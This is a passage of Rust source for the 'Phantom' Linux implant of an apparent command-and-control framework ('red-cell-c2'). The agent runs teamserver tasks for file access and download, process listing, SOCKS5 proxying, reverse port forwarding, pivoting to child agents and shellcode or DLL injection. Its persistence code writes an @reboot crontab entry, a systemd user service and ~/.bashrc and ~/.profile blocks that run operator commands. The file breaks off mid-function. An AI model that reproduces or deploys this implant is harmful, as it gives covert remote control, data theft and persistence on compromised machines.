//! Linux task execution for the Phantom agent.

use std::collections::{BTreeMap, HashMap};
use std::ffi::OsString;
use std::fs;
use std::io::{ErrorKind, Read, Write};
use std::net::{Ipv4Addr, SocketAddrV4, TcpListener, TcpStream};
use std::os::unix::fs::MetadataExt;
use std::os::unix::net::UnixStream;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::{SystemTime, UNIX_EPOCH};

use red_cell_common::demon::{
    DemonCallback, DemonCommand, DemonConfigKey, DemonFilesystemCommand, DemonNetCommand,
    DemonPackage, DemonPivotCommand, DemonProcessCommand, DemonSocketCommand, DemonSocketType,
    DemonTransferCommand, PhantomPersistMethod, PhantomPersistOp,
};
use time::OffsetDateTime;
use tokio::net::TcpStream as TokioTcpStream;
use tokio::process::Command;

use crate::config::PhantomConfig;
use crate::error::PhantomError;
use crate::parser::TaskParser;
use crate::protocol::executable_name;

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum PendingCallback {
    Output { request_id: u32, text: String },
    Error { request_id: u32, text: String },
    Exit { request_id: u32, exit_method: u32 },
    KillDate { request_id: u32 },
    Structured { command_id: u32, request_id: u32, payload: Vec<u8> },
    MemFileAck { request_id: u32, mem_file_id: u32, success: bool },
    FsUpload { request_id: u32, file_size: u32, path: String },
    Socket { request_id: u32, payload: Vec<u8> },
    FileOpen { request_id: u32, file_id: u32, file_size: u64, file_path: String },
    FileChunk { request_id: u32, file_id: u32, data: Vec<u8> },
    FileClose { request_id: u32, file_id: u32 },
}

#[derive(Debug, Default)]
pub(crate) struct PhantomState {
    mem_files: HashMap<u32, MemFile>,
    reverse_port_forwards: HashMap<u32, ReversePortForward>,
    socks_proxies: HashMap<u32, SocksProxy>,
    sockets: HashMap<u32, ManagedSocket>,
    local_relays: HashMap<u32, LocalRelayConnection>,
    socks_clients: HashMap<u32, SocksClient>,
    downloads: Vec<ActiveDownload>,
    pending_callbacks: Vec<PendingCallback>,
    /// Active SMB pivot connections keyed by child agent DemonID.
    smb_pivots: HashMap<u32, PivotConnection>,
    /// Kill date set dynamically by the teamserver via `CommandKillDate` or `CommandConfig`.
    kill_date: Option<i64>,
    /// Working-hours bitmask set dynamically by the teamserver via `CommandConfig`.
    working_hours: Option<i32>,
}

/// An active pivot connection to a child agent via a Unix domain socket.
#[derive(Debug)]
struct PivotConnection {
    /// The Unix domain socket path used for this pivot.
    pipe_name: String,
    /// Non-blocking Unix domain socket connected to the child agent.
    stream: UnixStream,
}

#[derive(Debug)]
struct MemFile {
    expected_size: usize,
    data: Vec<u8>,
}

#[derive(Debug)]
struct ReversePortForward {
    listener: TcpListener,
    mode: ReversePortForwardMode,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ReversePortForwardMode {
    Teamserver,
    Local,
}

#[derive(Debug)]
struct SocksProxy {
    listener: TcpListener,
    bind_addr: u32,
    bind_port: u32,
}

#[derive(Debug)]
struct ManagedSocket {
    stream: TcpStream,
    socket_type: DemonSocketType,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
}

#[derive(Debug)]
struct LocalRelayConnection {
    left: TcpStream,
    right: TcpStream,
    parent_id: u32,
}

#[derive(Debug)]
struct SocksClient {
    stream: TcpStream,
    server_id: u32,
    state: SocksClientState,
}

#[derive(Debug)]
enum SocksClientState {
    Greeting { buffer: Vec<u8> },
    Request { buffer: Vec<u8> },
    Relay { target: TcpStream },
}

/// Default chunk size for file downloads (512 KiB).
const DOWNLOAD_CHUNK_SIZE: usize = 512 * 1024;

/// State of an active download in the agent.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DownloadTransferState {
    Running = 1,
    Stopped = 2,
    Remove = 3,
}

/// An active file download being sent back to the teamserver in chunks.
#[derive(Debug)]
struct ActiveDownload {
    file_id: u32,
    request_id: u32,
    file: std::fs::File,
    total_size: u64,
    read_size: u64,
    state: DownloadTransferState,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct SocksConnectRequest {
    atyp: u8,
    address: Vec<u8>,
    port: u16,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SocksRequestError {
    GeneralFailure,
    CommandNotSupported,
    AddressTypeNotSupported,
}

#[derive(Debug)]
struct FilesystemEntry {
    name: String,
    is_dir: bool,
    size: u64,
    modified: ModifiedTime,
}

#[derive(Debug)]
struct FilesystemListing {
    root_path: String,
    entries: Vec<FilesystemEntry>,
}

#[derive(Debug)]
struct ModifiedTime {
    day: u32,
    month: u32,
    year: u32,
    minute: u32,
    hour: u32,
}

#[derive(Debug)]
struct ProcessEntry {
    name: String,
    pid: u32,
    parent_pid: u32,
    session: u32,
    threads: u32,
    user: String,
    is_wow64: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct SessionEntry {
    client: String,
    user: String,
    active: u32,
    idle: u32,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ShareEntry {
    name: String,
    path: String,
    remark: String,
    access: u32,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct GroupEntry {
    name: String,
    description: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct UserEntry {
    name: String,
    is_admin: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct MemoryRegion {
    base: u64,
    size: u32,
    protect: u32,
    state: u32,
    mem_type: u32,
}

const PAGE_NOACCESS: u32 = 0x01;
const PAGE_READONLY: u32 = 0x02;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_WRITECOPY: u32 = 0x08;
const PAGE_EXECUTE: u32 = 0x10;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
const MEM_COMMIT: u32 = 0x1000;
const MEM_PRIVATE: u32 = 0x20_000;
const MEM_MAPPED: u32 = 0x40_000;
const MEM_IMAGE: u32 = 0x100_0000;
const SOCKS_VERSION: u8 = 5;
const SOCKS_METHOD_NO_AUTH: u8 = 0;
const SOCKS_METHOD_NOT_ACCEPTABLE: u8 = 0xFF;
const SOCKS_COMMAND_CONNECT: u8 = 1;
const SOCKS_REPLY_SUCCEEDED: u8 = 0;
const SOCKS_REPLY_GENERAL_FAILURE: u8 = 1;
const SOCKS_REPLY_COMMAND_NOT_SUPPORTED: u8 = 7;
const SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED: u8 = 8;

/// Maximum number of framed messages to read per pivot per poll cycle.
const MAX_PIVOT_READS_PER_POLL: usize = 30;
/// Maximum allowed pivot frame size (30 MiB, matches `DEMON_MAX_RESPONSE_LENGTH`).
const PIVOT_MAX_FRAME_SIZE: usize = 0x1E0_0000;

impl PhantomState {
    pub(crate) async fn poll(&mut self) -> Result<(), PhantomError> {
        self.accept_reverse_port_forward_clients().await?;
        self.accept_socks_proxy_clients()?;
        self.poll_sockets().await?;
        self.poll_local_relays()?;
        self.poll_socks_clients().await?;
        self.push_download_chunks();
        self.poll_pivots();
        Ok(())
    }

    pub(crate) fn drain_callbacks(&mut self) -> Vec<PendingCallback> {
        std::mem::take(&mut self.pending_callbacks)
    }

    fn queue_callback(&mut self, callback: PendingCallback) {
        self.pending_callbacks.push(callback);
    }

    /// Return the kill date set dynamically by the teamserver, if any.
    pub(crate) fn kill_date(&self) -> Option<i64> {
        self.kill_date
    }

    /// Return the working-hours bitmask set dynamically by the teamserver, if any.
    pub(crate) fn working_hours(&self) -> Option<i32> {
        self.working_hours
    }

    /// Set or clear the dynamic kill date (Unix timestamp in seconds).
    #[cfg(test)]
    pub(crate) fn set_kill_date(&mut self, kill_date: Option<i64>) {
        self.kill_date = kill_date;
    }

    /// Set or clear the dynamic working-hours bitmask.
    #[cfg(test)]
    pub(crate) fn set_working_hours(&mut self, working_hours: Option<i32>) {
        self.working_hours = working_hours;
    }

    /// Queue a `CommandKillDate` callback to notify the teamserver that
    /// the kill date has been reached.
    pub(crate) fn queue_kill_date_callback(&mut self) {
        self.queue_callback(PendingCallback::KillDate { request_id: 0 });
    }

    /// Read a chunk from each running download and queue file-write callbacks.
    ///
    /// Downloads that have been fully read or marked for removal are cleaned up
    /// with a file-close callback.
    fn push_download_chunks(&mut self) {
        let mut finished_indices = Vec::new();

        for (index, download) in self.downloads.iter_mut().enumerate() {
            if download.state == DownloadTransferState::Stopped {
                continue;
            }

            if download.state == DownloadTransferState::Remove {
                finished_indices.push(index);
                continue;
            }

            let mut buf = vec![0u8; DOWNLOAD_CHUNK_SIZE];
            let read = match Read::read(&mut download.file, &mut buf) {
                Ok(n) => n,
                Err(_) => {
                    finished_indices.push(index);
                    continue;
                }
            };

            if read > 0 {
                buf.truncate(read);
                download.read_size += read as u64;
                self.pending_callbacks.push(PendingCallback::FileChunk {
                    request_id: download.request_id,
                    file_id: download.file_id,
                    data: buf,
                });
            }

            if read == 0 || download.read_size >= download.total_size {
                finished_indices.push(index);
            }
        }

        // Process removals in reverse order to maintain index validity.
        for &index in finished_indices.iter().rev() {
            let download = self.downloads.remove(index);
            self.pending_callbacks.push(PendingCallback::FileClose {
                request_id: download.request_id,
                file_id: download.file_id,
            });
        }
    }

    /// Poll all active pivot connections for data from child agents.
    ///
    /// For each pivot, reads length-framed messages from the Unix socket
    /// (non-blocking) and wraps them in `DEMON_PIVOT_SMB_COMMAND` callbacks
    /// for relay to the teamserver. Broken connections are automatically
    /// removed and reported via `DEMON_PIVOT_SMB_DISCONNECT`.
    fn poll_pivots(&mut self) {
        let mut disconnected: Vec<u32> = Vec::new();

        for (&agent_id, pivot) in &mut self.smb_pivots {
            // Read up to MAX_PIVOT_READS_PER_POLL framed messages per pivot.
            for _ in 0..MAX_PIVOT_READS_PER_POLL {
                match pivot_read_frame(&pivot.stream) {
                    Ok(Some(frame)) => {
                        let mut payload = encode_u32(u32::from(DemonPivotCommand::SmbCommand));
                        payload.extend_from_slice(&encode_bytes_result(&frame));
                        self.pending_callbacks.push(PendingCallback::Structured {
                            command_id: u32::from(DemonCommand::CommandPivot),
                            request_id: 0,
                            payload,
                        });
                    }
                    Ok(None) => break, // no more data available
                    Err(_) => {
                        disconnected.push(agent_id);
                        break;
                    }
                }
            }
        }

        for agent_id in disconnected {
            let removed = self.smb_pivots.remove(&agent_id).is_some();
            let mut payload = encode_u32(u32::from(DemonPivotCommand::SmbDisconnect));
            payload.extend_from_slice(&encode_bool(removed));
            payload.extend_from_slice(&encode_u32(agent_id));
            self.pending_callbacks.push(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandPivot),
                request_id: 0,
                payload,
            });
        }
    }

    async fn accept_reverse_port_forward_clients(&mut self) -> Result<(), PhantomError> {
        let listener_ids = self.reverse_port_forwards.keys().copied().collect::<Vec<_>>();
        let mut accepted = Vec::new();

        for listener_id in listener_ids {
            let Some(listener) = self.reverse_port_forwards.get(&listener_id) else {
                continue;
            };

            loop {
                match listener.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream
                            .set_nonblocking(true)
                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
                        accepted.push((
                            listener_id,
                            listener.mode,
                            listener.bind_addr,
                            listener.bind_port,
                            listener.forward_addr,
                            listener.forward_port,
                            stream,
                        ));
                    }
                    Err(error) if error.kind() == ErrorKind::WouldBlock => break,
                    Err(error) => {
                        return Err(PhantomError::Socket(error.to_string()));
                    }
                }
            }
        }

        for (listener_id, mode, bind_addr, bind_port, forward_addr, forward_port, stream) in
            accepted
        {
            match mode {
                ReversePortForwardMode::Teamserver => {
                    let socket_id = self.allocate_socket_id();
                    self.sockets.insert(
                        socket_id,
                        ManagedSocket {
                            stream,
                            socket_type: DemonSocketType::Client,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        },
                    );
                    self.queue_callback(PendingCallback::Socket {
                        request_id: 0,
                        payload: encode_socket_open(
                            socket_id,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    });

                    if !self.reverse_port_forwards.contains_key(&listener_id) {
                        self.remove_socket(socket_id);
                    }
                }
                ReversePortForwardMode::Local => {
                    if !self.reverse_port_forwards.contains_key(&listener_id) {
                        continue;
                    }
                    if let Ok(target) = connect_ipv4_target(forward_addr, forward_port as u16).await
                    {
                        self.local_relays.insert(
                            self.allocate_socket_id(),
                            LocalRelayConnection {
                                left: stream,
                                right: target,
                                parent_id: listener_id,
                            },
                        );
                    }
                }
            }
        }

        Ok(())
    }

    fn accept_socks_proxy_clients(&mut self) -> Result<(), PhantomError> {
        let server_ids = self.socks_proxies.keys().copied().collect::<Vec<_>>();
        let mut accepted = Vec::new();

        for server_id in server_ids {
            let Some(proxy) = self.socks_proxies.get(&server_id) else {
                continue;
            };

            loop {
                match proxy.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream
                            .set_nonblocking(true)
                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
                        accepted.push((server_id, stream));
                    }
                    Err(error) if error.kind() == ErrorKind::WouldBlock => break,
                    Err(error) => return Err(PhantomError::Socket(error.to_string())),
                }
            }
        }

        for (server_id, stream) in accepted {
            if !self.socks_proxies.contains_key(&server_id) {
                continue;
            }
            self.socks_clients.insert(
                self.allocate_socket_id(),
                SocksClient {
                    stream,
                    server_id,
                    state: SocksClientState::Greeting { buffer: Vec::new() },
                },
            );
        }

        Ok(())
    }

    async fn poll_sockets(&mut self) -> Result<(), PhantomError> {
        let socket_ids = self.sockets.keys().copied().collect::<Vec<_>>();
        let mut removals = Vec::new();

        for socket_id in socket_ids {
            let mut read_failure = None;
            let mut read_success = None;

            {
                let Some(socket) = self.sockets.get_mut(&socket_id) else {
                    continue;
                };

                let mut data = Vec::new();
                let mut buffer = [0_u8; 4096];

                loop {
                    match socket.stream.read(&mut buffer) {
                        Ok(0) => {
                            removals.push(socket_id);
                            break;
                        }
                        Ok(read) => data.extend_from_slice(&buffer[..read]),
                        Err(error) if error.kind() == ErrorKind::WouldBlock => break,
                        Err(error) => {
                            read_failure = Some(PendingCallback::Socket {
                                request_id: 0,
                                payload: encode_socket_read_failure(
                                    socket_id,
                                    socket.socket_type,
                                    raw_socket_error(&error),
                                ),
                            });
                            removals.push(socket_id);
                            break;
                        }
                    }
                }

                if !data.is_empty() {
                    read_success = Some(PendingCallback::Socket {
                        request_id: 0,
                        payload: encode_socket_read_success(socket_id, socket.socket_type, &data)?,
                    });
                }
            }

            if let Some(callback) = read_failure {
                self.queue_callback(callback);
            }
            if let Some(callback) = read_success {
                self.queue_callback(callback);
            }
        }

        for socket_id in removals {
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    fn poll_local_relays(&mut self) -> Result<(), PhantomError> {
        let relay_ids = self.local_relays.keys().copied().collect::<Vec<_>>();
        let mut removals = Vec::new();

        for relay_id in relay_ids {
            let Some(relay) = self.local_relays.get_mut(&relay_id) else {
                continue;
            };

            let left_result = pump_stream(&mut relay.left, &mut relay.right);
            let right_result = pump_stream(&mut relay.right, &mut relay.left);
            if left_result || right_result {
                removals.push(relay_id);
            }
        }

        for relay_id in removals {
            self.local_relays.remove(&relay_id);
        }

        Ok(())
    }

    async fn poll_socks_clients(&mut self) -> Result<(), PhantomError> {
        let client_ids = self.socks_clients.keys().copied().collect::<Vec<_>>();
        let mut removals = Vec::new();

        for client_id in client_ids {
            let Some(client) = self.socks_clients.get_mut(&client_id) else {
                continue;
            };

            match &mut client.state {
                SocksClientState::Greeting { buffer } => {
                    let closed = read_available(&mut client.stream, buffer)?;
                    if closed {
                        removals.push(client_id);
                        continue;
                    }

                    match try_parse_socks_greeting(buffer) {
                        None => {}
                        Some(Ok(consumed)) => {
                            let remainder = buffer.split_off(consumed);
                            write_all_nonblocking(
                                &mut client.stream,
                                &[SOCKS_VERSION, SOCKS_METHOD_NO_AUTH],
                            )
                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
                            client.state = SocksClientState::Request { buffer: remainder };
                        }
                        Some(Err(method)) => {
                            let _ =
                                write_all_nonblocking(&mut client.stream, &[SOCKS_VERSION, method]);
                            removals.push(client_id);
                        }
                    }
                }
                SocksClientState::Request { buffer } => {
                    let closed = read_available(&mut client.stream, buffer)?;
                    if closed {
                        removals.push(client_id);
                        continue;
                    }

                    match try_parse_socks_request(buffer) {
                        None => {}
                        Some(Ok((consumed, request))) => {
                            let remainder = buffer.split_off(consumed);
                            match connect_socks_target(request.atyp, &request.address, request.port)
                                .await
                            {
                                Ok(mut target) => {
                                    send_socks_reply(
                                        &mut client.stream,
                                        SOCKS_REPLY_SUCCEEDED,
                                        request.atyp,
                                        &request.address,
                                        request.port,
                                    )?;
                                    if !remainder.is_empty() {
                                        write_all_nonblocking(&mut target, &remainder).map_err(
                                            |error| PhantomError::Socket(error.to_string()),
                                        )?;
                                    }
                                    client.state = SocksClientState::Relay { target };
                                }
                                Err(_error_code) => {
                                    send_socks_reply(
                                        &mut client.stream,
                                        SOCKS_REPLY_GENERAL_FAILURE,
                                        request.atyp,
                                        &request.address,
                                        request.port,
                                    )?;
                                    removals.push(client_id);
                                }
                            }
                        }
                        Some(Err(error)) => {
                            let reply = match error {
                                SocksRequestError::GeneralFailure => SOCKS_REPLY_GENERAL_FAILURE,
                                SocksRequestError::CommandNotSupported => {
                                    SOCKS_REPLY_COMMAND_NOT_SUPPORTED
                                }
                                SocksRequestError::AddressTypeNotSupported => {
                                    SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED
                                }
                            };
                            let _ = write_all_nonblocking(
                                &mut client.stream,
                                &[SOCKS_VERSION, reply, 0, 1, 0, 0, 0, 0, 0, 0],
                            );
                            removals.push(client_id);
                        }
                    }
                }
                SocksClientState::Relay { target } => {
                    let client_failed = pump_stream(&mut client.stream, target);
                    let target_failed = pump_stream(target, &mut client.stream);
                    if client_failed || target_failed {
                        removals.push(client_id);
                    }
                }
            }
        }

        for client_id in removals {
            self.socks_clients.remove(&client_id);
        }

        Ok(())
    }

    fn allocate_socket_id(&self) -> u32 {
        let mut socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
        while self.sockets.contains_key(&socket_id)
            || self.reverse_port_forwards.contains_key(&socket_id)
            || self.socks_proxies.contains_key(&socket_id)
            || self.local_relays.contains_key(&socket_id)
            || self.socks_clients.contains_key(&socket_id)
        {
            socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
        }
        socket_id
    }

    fn remove_socket(&mut self, socket_id: u32) {
        let Some(socket) = self.sockets.remove(&socket_id) else {
            return;
        };

        let payload = match socket.socket_type {
            DemonSocketType::Client | DemonSocketType::ReversePortForward => {
                encode_rportfwd_remove(
                    socket_id,
                    socket.socket_type,
                    socket.bind_addr,
                    socket.bind_port,
                    socket.forward_addr,
                    socket.forward_port,
                )
            }
            DemonSocketType::ReverseProxy => {
                encode_socket_close(socket_id, DemonSocketType::ReverseProxy)
            }
        };

        self.queue_callback(PendingCallback::Socket { request_id: 0, payload });
    }

    fn remove_reverse_port_forward(&mut self, socket_id: u32) {
        let Some(listener) = self.reverse_port_forwards.remove(&socket_id) else {
            return;
        };

        let client_ids = self
            .sockets
            .iter()
            .filter_map(|(client_id, socket)| {
                (socket.socket_type == DemonSocketType::Client
                    && socket.bind_addr == listener.bind_addr
                    && socket.bind_port == listener.bind_port
                    && socket.forward_addr == listener.forward_addr
                    && socket.forward_port == listener.forward_port)
                    .then_some(*client_id)
            })
            .collect::<Vec<_>>();
        for client_id in client_ids {
            self.remove_socket(client_id);
        }

        let relay_ids = self
            .local_relays
            .iter()
            .filter_map(|(relay_id, relay)| (relay.parent_id == socket_id).then_some(*relay_id))
            .collect::<Vec<_>>();
        for relay_id in relay_ids {
            self.local_relays.remove(&relay_id);
        }

        self.queue_callback(PendingCallback::Socket {
            request_id: 0,
            payload: encode_rportfwd_remove(
                socket_id,
                DemonSocketType::ReversePortForward,
                listener.bind_addr,
                listener.bind_port,
                listener.forward_addr,
                listener.forward_port,
            ),
        });
    }
}

impl MemFile {
    fn append(&mut self, data: &[u8]) {
        self.data.extend_from_slice(data);
        if self.data.len() > self.expected_size {
            self.data.truncate(self.expected_size);
        }
    }

    fn is_complete(&self) -> bool {
        self.data.len() == self.expected_size
    }
}

/// Execute a single Demon task package.
pub(crate) async fn execute(
    package: &DemonPackage,
    config: &mut PhantomConfig,
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    match package.command()? {
        DemonCommand::CommandNoJob => {}
        DemonCommand::CommandSleep => {
            let mut parser = TaskParser::new(&package.payload);
            let delay_ms = u32::try_from(parser.int32()?).unwrap_or(0);
            let jitter = u32::try_from(parser.int32().unwrap_or(0)).unwrap_or(0).min(100);
            config.sleep_delay_ms = delay_ms;
            config.sleep_jitter = jitter;
            state.queue_callback(PendingCallback::Output {
                request_id: package.request_id,
                text: format!("sleep updated to {delay_ms} ms"),
            });
        }
        DemonCommand::CommandFs => {
            execute_filesystem(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandProcList => {
            let payload = execute_process_list(&package.payload)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProcList),
                request_id: package.request_id,
                payload,
            });
        }
        DemonCommand::CommandProc => {
            execute_process(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandNet => {
            execute_network(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandSocket => {
            execute_socket(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandMemFile => {
            execute_memfile(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandTransfer => {
            execute_transfer(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandKillDate => {
            let mut parser = TaskParser::new(&package.payload);
            let kill_date = parser.int64()?;
            state.kill_date = if kill_date > 0 { Some(kill_date) } else { None };
            let label = if kill_date > 0 {
                format!("kill date set to {kill_date}")
            } else {
                String::from("kill date disabled")
            };
            state.queue_callback(PendingCallback::Output {
                request_id: package.request_id,
                text: label,
            });
        }
        DemonCommand::CommandConfig => {
            execute_config(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandPivot => {
            execute_pivot(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandScreenshot => {
            execute_screenshot(package.request_id, state).await?;
        }
        DemonCommand::CommandInjectShellcode => {
            execute_inject_shellcode(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandInjectDll => {
            execute_inject_dll(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandSpawnDll => {
            execute_spawn_dll(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandExit => {
            let mut parser = TaskParser::new(&package.payload);
            let exit_method = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative exit method"))?;
            state.queue_callback(PendingCallback::Exit {
                request_id: package.request_id,
                exit_method,
            });
        }
        DemonCommand::CommandPackageDropped => {
            execute_package_dropped(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandPersist => {
            execute_persist(package.request_id, &package.payload, state).await?;
        }
        // Windows-only commands: return explicit not-supported errors.
        command @ (DemonCommand::CommandToken
        | DemonCommand::CommandInlineExecute
        | DemonCommand::CommandJob
        | DemonCommand::CommandPsImport
        | DemonCommand::CommandAssemblyInlineExecute
        | DemonCommand::CommandAssemblyListVersions) => {
            state.queue_callback(PendingCallback::Error {
                request_id: package.request_id,
                text: format!("command {command:?} is not supported on Linux"),
            });
        }
        command => {
            state.queue_callback(PendingCallback::Error {
                request_id: package.request_id,
                text: format!("phantom does not implement command {command:?} yet"),
            });
        }
    }

    Ok(())
}

/// Marker appended to every crontab line and shell-rc block managed by Phantom.
/// Used to identify and remove our entries on request.
const PERSIST_MARKER: &str = "# red-cell-c2";

/// Unique label used as the systemd user unit name and in the shell-rc block.
const PERSIST_UNIT_NAME: &str = "red-cell";

/// Handle `CommandPersist` (ID 3000): install or remove a Linux persistence mechanism.
///
/// Payload layout (all little-endian):
/// ```text
/// u32  method   — PhantomPersistMethod (1=Cron, 2=SystemdUser, 3=ShellRc)
/// u32  op       — PhantomPersistOp (0=Install, 1=Remove)
/// str  command  — length-prefixed UTF-8 command string (required for Install,
///                 ignored for Remove)
/// ```
async fn execute_persist(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);

    let method_raw = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative persist method"))?;
    let method = PhantomPersistMethod::try_from(method_raw)
        .map_err(|_| PhantomError::TaskParse("unknown persist method"))?;

    let op_raw = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative persist op"))?;
    let op = PhantomPersistOp::try_from(op_raw)
        .map_err(|_| PhantomError::TaskParse("unknown persist op"))?;

    let command_str = match op {
        PhantomPersistOp::Install => parser.string()?,
        PhantomPersistOp::Remove => String::new(),
    };

    let result = match method {
        PhantomPersistMethod::Cron => persist_cron(op, &command_str).await,
        PhantomPersistMethod::SystemdUser => persist_systemd_user(op, &command_str).await,
        PhantomPersistMethod::ShellRc => persist_shell_rc(op, &command_str),
    };

    match result {
        Ok(msg) => state.queue_callback(PendingCallback::Output { request_id, text: msg }),
        Err(msg) => state.queue_callback(PendingCallback::Error { request_id, text: msg }),
    }

    Ok(())
}

/// Install or remove an `@reboot` crontab entry.
///
/// Install appends `@reboot <command> # red-cell-c2` to the current user's
/// crontab if the marker is not already present.  Remove filters out any line
/// containing the marker.
async fn persist_cron(op: PhantomPersistOp, command: &str) -> Result<String, String> {
    // Read existing crontab; treat an empty/missing crontab as success.
    let crontab_output = Command::new("crontab")
        .args(["-l"])
        .output()
        .await
        .map_err(|e| format!("crontab -l failed: {e}"))?;

    let existing = if crontab_output.status.success() {
        String::from_utf8_lossy(&crontab_output.stdout).into_owned()
    } else {
        // `crontab -l` exits non-zero when there is no crontab — that is fine.
        String::new()
    };

    let new_crontab = match op {
        PhantomPersistOp::Install => {
            if existing.contains(PERSIST_MARKER) {
                return Ok("cron persistence entry already present".into());
            }
            format!("{existing}@reboot {command} {PERSIST_MARKER}\n")
        }
        PhantomPersistOp::Remove => {
            if !existing.contains(PERSIST_MARKER) {
                return Ok("cron persistence entry not found — nothing removed".into());
            }
            existing
                .lines()
                .filter(|l| !l.contains(PERSIST_MARKER))
                .map(|l| format!("{l}\n"))
                .collect()
        }
    };

    // Write back via `crontab -`.
    let mut child = Command::new("crontab")
        .arg("-")
        .stdin(Stdio::piped())
        .spawn()
        .map_err(|e| format!("crontab - spawn failed: {e}"))?;

    {
        let stdin = child.stdin.as_mut().ok_or_else(|| "crontab stdin unavailable".to_owned())?;
        tokio::io::AsyncWriteExt::write_all(stdin, new_crontab.as_bytes())
            .await
            .map_err(|e| format!("crontab write failed: {e}"))?;
    }

    let status = child.wait().await.map_err(|e| format!("crontab wait failed: {e}"))?;
    if !status.success() {
        return Err(format!("crontab exited with status {status}"));
    }

    Ok(match op {
        PhantomPersistOp::Install => "cron persistence entry installed".into(),
        PhantomPersistOp::Remove => "cron persistence entry removed".into(),
    })
}

/// Install or remove a systemd user service unit at
/// `~/.config/systemd/user/red-cell.service`.
async fn persist_systemd_user(op: PhantomPersistOp, command: &str) -> Result<String, String> {
    let home = std::env::var("HOME").map_err(|_| "HOME not set".to_owned())?;
    let unit_dir = PathBuf::from(&home).join(".config/systemd/user");
    let unit_path = unit_dir.join(format!("{PERSIST_UNIT_NAME}.service"));

    match op {
        PhantomPersistOp::Install => {
            fs::create_dir_all(&unit_dir)
                .map_err(|e| format!("create {}: {e}", unit_dir.display()))?;

            let unit_content = format!(
                "[Unit]\n                 Description=Red Cell C2 persistence ({PERSIST_MARKER})\n                 After=default.target\n                 \n                 [Service]\n                 Type=simple\n                 ExecStart={command}\n                 Restart=on-failure\n                 \n                 [Install]\n                 WantedBy=default.target\n"
            );

            fs::write(&unit_path, unit_content)
                .map_err(|e| format!("write {}: {e}", unit_path.display()))?;

            // Reload daemon, then enable + start the unit.
            run_systemctl(&["--user", "daemon-reload"]).await?;
            run_systemctl(&["--user", "enable", &format!("{PERSIST_UNIT_NAME}.service")]).await?;
            run_systemctl(&["--user", "start", &format!("{PERSIST_UNIT_NAME}.service")]).await?;

            Ok(format!("systemd user unit installed at {}", unit_path.display()))
        }
        PhantomPersistOp::Remove => {
            if !unit_path.exists() {
                return Ok("systemd user unit not found — nothing removed".into());
            }

            // Best-effort stop/disable; ignore errors so we still clean up the file.
            let _ =
                run_systemctl(&["--user", "stop", &format!("{PERSIST_UNIT_NAME}.service")]).await;
            let _ = run_systemctl(&["--user", "disable", &format!("{PERSIST_UNIT_NAME}.service")])
                .await;

            fs::remove_file(&unit_path)
                .map_err(|e| format!("remove {}: {e}", unit_path.display()))?;

            run_systemctl(&["--user", "daemon-reload"]).await?;

            Ok(format!("systemd user unit removed from {}", unit_path.display()))
        }
    }
}

/// Run `systemctl` with the given arguments, returning an error string on failure.
async fn run_systemctl(args: &[&str]) -> Result<(), String> {
    let status = Command::new("systemctl")
        .args(args)
        .status()
        .await
        .map_err(|e| format!("systemctl {:?} failed: {e}", args))?;
    if status.success() {
        Ok(())
    } else {
        Err(format!("systemctl {:?} exited with {status}", args))
    }
}

/// Install or remove a persistence stanza in `~/.bashrc` and `~/.profile`.
///
/// Install appends a clearly delimited block to both files if the marker is
/// not already present.  Remove strips the delimited block from both files.
fn persist_shell_rc(op: PhantomPersistOp, command: &str) -> Result<String, String> {
    let home = std::env::var("HOME").map_err(|_| "HOME not set".to_owned())?;
    let targets = [PathBuf::from(&home).join(".bashrc"), PathBuf::from(&home).join(".profile")];

    let begin_marker = format!("# BEGIN {PERSIST_MARKER}");
    let end_marker = format!("# END {PERSIST_MARKER}");

    let mut touched = Vec::new();
    let mut already_present = Vec::new();
